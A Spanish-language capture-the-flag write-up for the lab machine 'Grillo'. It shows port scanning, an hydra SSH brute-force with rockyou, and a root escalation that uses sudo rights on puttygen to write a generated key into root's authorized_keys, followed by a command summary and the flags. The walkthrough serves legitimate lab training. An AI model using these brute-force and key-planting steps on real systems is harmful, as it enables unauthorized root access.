---
title: CTF-TheHackersLabs-Grillo
published: true
---

## WriteUps maquina Grillo de The Hackers Labs

---
tags:
  - CTF
  - estado/completado
  - plataforma: [TheHackersLabs]
  - dificultad: Fácil
  - autor: [CuriosidadesDeHackers] & [Condor]

# Datos

[!INFO] Grillo
  - **Nombre:** Grillo
  - **SO:** Linux
  - **Dificultad:** Fácil
  - **Fecha de creación:** 21/04/2024
  - **MD5:** 7fc0db761520fefd296e634e99b2da08.
  - **Descargar**: [The Hackers Labs](https://thehackerslabs.com/)


[!TODO] Objetivo
  - Obtener: 🚩 user.txt / - 🚩 root.txt
  - IP: 192.168.1.11


# Reconocimiento

Empiezo esta nueva aventura, con un animalito, llamado **Grillo**, y de una al iniciar veo el grub de inicio, a lo que intento acceder para modificar cositas, sin embargo los creadores pensaron en eso y le establecieron contraseña, ademas que añadieron detalles interesantes en la pantalla de inicio, así que paso al realizar el nmap y me encuentro con:


```bash
nmap -p- --open -sC -sS -sV --min-rate=5000 -n -vvv -Pn 192.168.1.11

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGjZjT9uVInycGr+L2uWFk2OHfIU6ziqLqjc31ns1WmQ6Hr6uDnP8LT23hig2aIXwb3uRT1F7Q1q5YSr4zozu64=
|   256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINl5E2qTz+BE4drC1MXdiCyaKavO+3ur4RldEaIe41fC
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
MAC Address: 08:00:27:05:E8:4D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![PantallaInicioGrilloCTF.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/PantallaInicioGrilloCTF.png)

Primer paso, ingresar a la dirección ip, para ver que me encuentro en el puerto 80, con el servicio apache, y veo la pagina de index por defecto de apache2, pero por costumbre paso a chequear el código fuente y algo extraño llama mi atención, existen más lineas después del `</html>` y al bajar encuentro un lindo comentario, que ya me da un usuario.

![UsuarioSSHGrillo.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/UsuarioSSHGrillo.png)

Así que sin pensarlo mucho, le mando un `rockyou.txt` al servicio `ssh` con el usuario `melanie` y veamos si obtenemos un resultados sastifactorio.

Y mientras `hydra` hace su trabajo, voy curioseando un poco en la web, pues al final uno de sus creadores, su nombre de usuario es: `Curiosidades de Hackers`, así que toca ver que curiosidades tiene esta máquina..

Por lo tanto, le mando un `whatweb` y al parecer no veo nada interesante.


```bash
whatweb -v http://192.168.1.11/            
WhatWeb report for http://192.168.1.11/
Status    : 200 OK
Title     : Apache2 Debian Default Page: It works
IP        : 192.168.1.11
Country   : RESERVED, ZZ

Summary   : Apache[2.4.57], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.57 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Debian Linux
	String       : Apache/2.4.57 (Debian) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Sun, 21 Apr 2024 22:08:55 GMT
	Server: Apache/2.4.57 (Debian)
	Last-Modified: Fri, 12 Apr 2024 18:31:46 GMT
	ETag: "2a53-615ea7beef39f-gzip"
	Accept-Ranges: bytes
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 3082
	Connection: close
	Content-Type: text/html
```

Y como `hydra` sigue trabajando, decido lanzar ahora un `gobuster` 

`gobuster dir -u http://192.168.1.11 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt` y el resultado no me muestra nada.


```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

Así que intentare con otra herramienta de fuzzing web, como es `dirb` y tampoco encuentro algo, lo peor es que `hydra` tampoco me esta mostrando nada.

![HydraGriloTHLabs.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/HydraGriloTHLabs.png)

Y yo pensando que la maquina seria fácil xD, resultado de `dirb` 


```bash
---- Scanning URL: http://192.168.1.11/ ----
+ http://192.168.1.11/index.html (CODE:200 |SIZE:10835)                                                                                                                                       
+ http://192.168.1.11/server-status (CODE:403|SIZE:277) 
```

# Análisis de vulnerabilidades

Y ya cuando me estaba desanimando y preocupando, resultado que `hydra` devuelve la alegría y emoción a mi rostro, pues encuentra la contraseña de SSH.

![ClaveSSHMelanieTHLabs.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/ClaveSSHMelanieTHLabs.png)


No lo dudo ni un segundo, me conecto por ssh con los datos obtenidos y de inmediato capturo mi primera flag, `melanie@grillo:~$ cat user.txt` 

# Escalada de privilegios

Ahora toca elevar privilegios, lo primero que hago es un típico: `sudo -l` y obtengo este resultado: 

```
User melanie may run the following commands on grillo:
    (root) NOPASSWD: /usr/bin/puttygen
```

Y de forma automática, me voy a [gtfobins.github.io](https://gtfobins.github.io/) para buscar este binario y terminar rápido con la maquina, sin embargo resulta que no aparece ni como `putty` ni menos como `puttygen` intento algunas cosas para ver si logro acceder como `root`pero sin resultado, así que procedo a ir mi gran amigo, `San Google` y lamento decir que no encontré mucha información.

---

Luego de horas, horas y horas, bloqueado por completo, estuve en la [comunidad de discord](https://discord.gg/4wtzBjUVxd) con el usuario `@murrusko` quien justo estaba haciendo la maquina también, nos intercambiamos mensajes en el canal y pues entre lo que compartíamos al final él dio con la respuesta, y me dio las pistas necesarias para dar con la solución.

Desde aquí nuevamente muchas gracias `@murrusko` y en especial a los creadores por permitir el intercambio de pistas en la comunidad de discord.

Nota: agradecimiento también a `@suraxddq` quien fue el primer usuario en resolver esta maquina, nos dio de pistas que leamos el man de ssh, que pensemos en que cosas se necesitaba, ¿cual era el requisito de conexión?

----

# PWNED

Al final la solución fue crear una nueva clave `rsa` para el usuario `melanie`:

`puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id`

Y ahora un paso muy importante que a mi me estaba faltando y es el secreto para la solución de esta maquina; que es nada mas y nada menos que añadir esta nueva clave creada al `authorized keys` de la siguiente forma:

`puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys`

Entonces ya tengo una clave `rsa` nueva para el usuario añadida de forma correcta, el siguiente paso seria, copiar esta clave en el usuario root y lo hago así:

`sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/id`

Luego como se realizo con `melanie` debo añadir esta nueva clave de root al `authorized_keys` de la siguiente forma:

`sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh`

Con eso solo me toca descargar en mi maquina local, la clave `rsa` creada:

`scp melanie@192.168.1.11:/home/melanie/.ssh/id .`

Ya teniendo esta clave en mi maquina, solo debo hacer uso de ella para conectarme con el usuario root por ssh a la maquina objetivo.

   `ssh -i id root@192.168.1.11`

¡Y listo! Con eso se consigue el acceso root de esta maquina, me resta hacer un `cat` de la flag y objetivo completado.


# Bandera(s)

[!FLAG] 
  - `User-flag{VGUgdG9jYSBvYnRlbmVyIGEgdGkgbGEgZmxhZw==}`
  - `Root-flag{QXF1aSBubyB2YXMgYSBlbmNvbnRyYXIgbmFkYQ==}`


# Comandos

[!IMPORTANT] Resumen de comandos utilizados
  - `nmap -p- --open -sC -sS -sV --min-rate=5000 -n -vvv -Pn 192.168.1.11`
  - `hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.11 -F`
  - `sudo -l`
  - `puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id`
  - `puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys`
  - `sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/id`
  - `sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh`
  - `scp melanie@192.168.1.11:/home/melanie/.ssh/id .`
  - `ssh -i id root@192.168.1.11`


```
¡Que la fuerza del hacking ético nos acompañe! :)
```

|   |
|:--|
|   |